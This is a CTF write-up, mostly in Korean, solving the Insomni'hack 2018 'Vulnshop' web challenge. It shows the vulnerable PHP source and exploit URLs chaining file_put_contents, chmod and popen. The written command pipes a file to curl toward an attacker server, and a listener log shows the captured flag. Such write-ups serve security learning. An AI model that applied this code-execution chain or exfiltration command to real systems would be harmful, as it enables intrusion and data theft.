# [WEB] Insomnia Hack Teaser 2018 - Vulnshop

## Description

We’re preparing a website for selling some important vulnerabilities in the future. You can browse some static pages on it, waiting for the official release.

[http://vulnshop.teaser.insomnihack.ch](http://vulnshop.teaser.insomnihack.ch/)

## Analysis

index.php의 소스를 얻을 수 있으며 소스의 중요한 부분을 보자.

```Php
if(isset($_GET['hl'])){ highlight_file(__FILE__); exit; } 
error_reporting(0); session_start();  
// Anti XSS filter 
$_REQUEST = array_map("strip_tags", $_REQUEST); 
// For later, when we will store infos about visitors. 
chdir("tmp"); 

switch($_GET['page']) { 
  case 'default': 
  default: 
    echo "<p>Welcome to our website about infosec. It's still under construction, but you can begin to browse some pages!</p>"; 
    break; 
  case 'introduction': 
    echo "<p>Our website will introduce some new vulnerabilities. Let's check it out later!</p>"; 
    break; 
  case 'privacy': 
    echo "<p>This website is unbreakable, so don't worry when contacting us about some new vulnerabilities!</p>"; 
    break; 
  case 'contactus': 
    echo "<p>You can't contact us for the moment, but it will be available later.</p>"; 
    $_SESSION['challenge'] = rand(100000,999999); 
    break; 
  case 'captcha': 
    if(isset($_SESSION['challenge'])) echo $_SESSION['challenge']; 
    // Will make an image later 
    touch($_SESSION['challenge']); 
    break; 
  case 'captcha-verify': 
    // verification functions take a file for later, when we'll provide more way of verification 
    function verifyFromString($file, $response) { 
      if($_SESSION['challenge'] === $response) return true; 
      else return false; 
    } 

    // Captcha from math op 
    function verifyFromMath($file, $response) { 
      if(eval("return ".$_SESSION['challenge']." ;") === $response) return true; 
      else return false; 
    } 
    if(isset($_REQUEST['answer']) && isset($_REQUEST['method']) && function_exists($_REQUEST['method'])){ 
      $_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']); 
    } 
    break; 

} 
```

page는 여러개의 case로 나뉘지만 실질적으로 사용하는 페이지는 3가지이다.

1. contactus

   challenge 세션의 값을 random(10000~99999)으로 생성한다.

2. captcha

   challenge 세션의 값이 존재하면 이 값을 보여주고, challege값과 같은 파일을 생성한다.

3. captcha-verify

   answer과 method 값을 받아 함수로써 실행해준다.

   `$_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']);`

이 문제에서는 phpinfo도 보여주며, disable function을 확인할 수 있다.

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,proc_open,system,shell_exec,exec,passthru,mail
```

exec관련 함수는 사용이 불가능해보이지만 popen함수는 disable_function에서 제외되어 있으므로 이를 이용해보자.

## Exploit

1. contactus에 접속하여 challenge 세션을 생성한다.

2. captcha에 접속하여 파일을 생성해준다.

3. captcha-verify에서 file_piut_contents함수를 사용해 다음과 같은 값을 파일에 쓴다.

   >   cat /flag | curl [MY_SERVER] -d @-

   `http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&answer=cat%20%2Fflag%20%7C%20curl%20[MY_SERVER]%20-d%20%40-&method=file_put_contents`

4. chmod함수를 이용해 파일에 실행 권한을 준다.

   `http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&answer=511&method=chmod`

5. popen을 이용해 파일을 실행시켜준다.

   `http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&answer=r&method=popen`

6. 서버에 저장한 명령어가 실행되면서 flag를 얻을 수 있다.

```
Listening on [0.0.0.0] (family 0, port 10101)
Connection from [MY_SERVER] port 10101 [tcp/*] accepted (family 2, sport 37054)
POST / HTTP/1.1
Host: MY_SERVER
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 38
Content-Type: application/x-www-form-urlencoded

INS{4rb1tr4ry_func_c4ll_is_n0t_s0_fun}
```



**INS{4rb1tr4ry_func_c4ll_is_n0t_s0_fun}**